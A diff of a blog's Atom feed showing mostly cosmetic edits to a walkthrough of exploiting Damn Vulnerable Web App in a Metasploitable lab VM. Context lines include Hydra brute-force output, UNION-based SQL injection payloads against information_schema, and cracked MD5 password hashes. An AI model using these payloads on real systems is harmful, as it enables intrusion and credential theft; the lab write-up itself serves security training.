@@ -4,7 +4,7 @@
   <title><![CDATA[/home/mislusnys]]></title>
   <link href="http://mislusnys.github.io/atom.xml" rel="self"/>
   <link href="http://mislusnys.github.io/"/>
-  <updated>2015-02-04T17:16:24-05:00</updated>
+  <updated>2015-02-04T17:26:38-05:00</updated>
   <id>http://mislusnys.github.io/</id>
   <author>
     <name><![CDATA[Mindaugas Slusnys]]></name>
@@ -285,14 +285,14 @@ Web applications frequently redirect and forward users to other pages and websit
     <id>http://mislusnys.github.io/blog/2015/02/02/damn-vulnerable-web-application</id>
     <content type="html"><![CDATA[<h2>Intro</h2>
 
-<blockquote><p>Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goals are to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and aid teachers/students to teach/learn web application security in a class room environment.</p></blockquote>
+<p>Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goals are to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and aid teachers/students to teach/learn web application security in a class room environment.</p>
 
 <!--more-->
 
 
 <p>In this report we will be exploiting the vulnerabilities that are present in the DVWA (version 1.0.7).
-We will use the version that is bundled in the <a href="http://sourceforge.net/projects/metasploitable/files/Metasploitable2/">Metasploitable 2</a> VM (IP address 192.168.52.129).
-We will use the lowest security setting (<strong>PHPIDS</strong>:disabled and <strong>Security Level</strong>:low).</p>
+We will use the version that is bundled in the <a href="http://sourceforge.net/projects/metasploitable/files/Metasploitable2/">Metasploitable 2</a> VM.
+We will use the lowest security setting (<em>PHPIDS:disabled</em> and <em>Security Level:low</em>).</p>
 
 <h2>Brute Force</h2>
 
@@ -334,8 +334,9 @@ We will use the lowest security setting (<strong>PHPIDS</strong>:disabled and <s
 </span><span class='line'>Hydra (http://www.thc.org/thc-hydra) finished at 2015-02-02 09:13:57</span></code></pre></td></tr></table></div></figure>
 
 
-<p>
-We found valid login credentials: <code>admin:password</code></p>
+<p></p>
+
+<p>We found valid login credentials: <code>admin:password</code></p>
 
 <h2>Command Execution</h2>
 
@@ -571,7 +572,8 @@ In our case the password change operation results in the following request:</p>
 </span><span class='line'>
 </span><span class='line'>ID:  ' union select table_name,null from information_schema.tables where table_schema='dvwa'-- -
 </span><span class='line'>First name: users
-</span><span class='line'>Surname: </span></code></pre></td></tr></table></div></figure>
+</span><span class='line'>Surname: 
+</span></code></pre></td></tr></table></div></figure>
 
 
 <blockquote><p>&lsquo; union select column_name,null from information_schema.columns where table_name=&#8217;users&rsquo;&ndash; -</p></blockquote>
@@ -666,7 +668,7 @@ In our case the password change operation results in the following request:</p>
 </span><span class='line'>Surname: 5f4dcc3b5aa765d61d8327deb882cf99</span></code></pre></td></tr></table></div></figure>
 
 
-<p>Looks like passwords are MD5 hashed. However, they are easily found to be <code>test</code>, <code>abc123</code>, <code>charley</code>, <code>letmein</code> and <code>password</code> respectively.</p>
+<p>Looks like the passwords are MD5 hashed. However, they are easily found to be <code>test</code>, <code>abc123</code>, <code>charley</code>, <code>letmein</code> and <code>password</code> respectively.</p>
 
 <h2>SQL Injection(Blind)</h2>
 
@@ -729,6 +731,8 @@ We can use <code>sqlmap</code> to automate SQL injection exploitation (especiall
 </span><span class='line'><span class="p">}</span>
 </span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
 </span></code></pre></td></tr></table></div></figure>
+
+
 
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
